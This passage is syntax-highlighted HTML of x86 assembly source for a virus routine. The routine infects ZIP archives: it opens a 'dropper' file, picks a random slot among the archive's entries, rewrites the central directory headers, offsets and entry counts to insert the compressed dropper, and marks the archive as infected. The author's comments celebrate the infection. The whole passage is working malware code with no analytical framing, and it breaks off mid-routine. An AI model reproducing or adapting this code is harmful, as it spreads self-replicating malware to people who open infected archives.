        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPEHeaderId</span><span class="sc4">],</span><span class="sc12">'KP'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iZIP_fClose</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPSignature</span><span class="sc4">],</span><span class="sc2">0605h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iZIP_fClose</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPNoDisk</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iZIP_fClose</span><span class="sc0">

        </span><span class="sc1">; open dropper file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewZIP.dropper</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iZIP_fClose</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get its file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dFSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; allocate memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dMemory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read its file body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dFSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dMemory</span><span class="sc4">]</span><span class="sc1">;destination buffer</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file pos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">

        </span><span class="sc1">; get dropper's start of header and its length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">0000000Ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;length of 2nd header</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;esi = header</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHSize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">; allocate memory for archive header + new header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPSizeDir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHeaders</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read them to the buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPSizeDir</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;include 3rd table as well</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPOffsetDir</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;file pos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iZIP_dealloc</span><span class="sc0">

        </span><span class="sc1">; get actual files in archive</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPEntrysDir</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; and select my new position :)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">00000001h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; get my future offset if I'll be in the end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPOffsetDir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fNewDPos</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; seek on my new position in the headers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHeaders</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__iZIP_search_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__iZIP_sEnd_1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">ZIPRScanSize1</span><span class="sc0">   </span><span class="sc1">;seek on FileNameSize</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; + filename length</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; + extra field</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">ZIPRScanSize2</span><span class="sc0">   </span><span class="sc1">;seek on text file folder</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__iZIP_search_1</span><span class="sc0">
    </span><span class="sc5">__iZIP_sEnd_1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;how many folders change ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;my new place for header</span><span class="sc0">
    </span><span class="sc5">__iZIP_search_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__iZIP_sEnd_2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">ZIPRScanSize1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc5">ZIPRScanSize3</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fNewDPos</span><span class="sc4">],</span><span class="sc2">0F0000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iZIP_search_2_next</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fNewDPos</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__iZIP_search_2_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dFSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;== fbody+2nd+3rd table</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;== - 3rd table</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;== - dropper's header size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc5">ZIPRScanSize3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add FileNameSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__iZIP_search_2</span><span class="sc0">
    </span><span class="sc5">__iZIP_sEnd_2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; get number of bytes to move</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;my new place</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;number of bytes to move</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;include last table as well</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;"almost" destination</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;dropper's header length</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__movsd_back</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; copy my new table, it means: "update header", please :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;start of dropper's header</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; change this copied header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ZIPRScanSize1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ZIPRScanSize3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fNewDPos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0F0000000h</span><span class="sc0">      </span><span class="sc1">;only if it is last "section"</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fNewDPos</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;start of data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; allocate memory for archive body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;sub start of data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;dropper's header length</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;3rd tablee</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fMemory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read part of archive file to the memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;dropper's header length</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;this was fucking bug !</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;i don't want 3rd table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;dropper's compressed body</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fMemory</span><span class="sc4">]</span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iZIP_dealloc</span><span class="sc0">

        </span><span class="sc1">; copy my compressed dropper before reader data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;dropper's compressed body s.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;"update" archive :)</span><span class="sc0">

        </span><span class="sc1">; copy my changed headers behind compressed datas</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;in the end of file</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">0000000Ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;length of the 2nd table</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">; - 3rd table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHeaders</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__iZIP_replace</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">06054B50h</span><span class="sc0">     </span><span class="sc1">;'PK',05,06 ? Last table ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iZIP_replace_finish</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iZIP_replace</span><span class="sc0">
    </span><span class="sc5">__iZIP_replace_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;copy last table</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; change last table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000006h</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;archive size + dropper body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;dropper's header length</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">0000000Ah</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;change ZIPSizeDir</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">0000000Eh</span><span class="sc4">]</span><span class="sc1">;increase ZIPEntryDisk</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">0000000Ch</span><span class="sc4">]</span><span class="sc1">;increase ZIPEntryDir</span><span class="sc0">

        </span><span class="sc1">; "update" archive file body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fNewDPos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyWriteFile</span><span class="sc0">

        </span><span class="sc1">; archive has been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__set_archive_infected</span><span class="sc0">

    </span><span class="sc5">__iZIP_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHeaders</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dMemory</span><span class="sc4">]</span><span class="sc0">
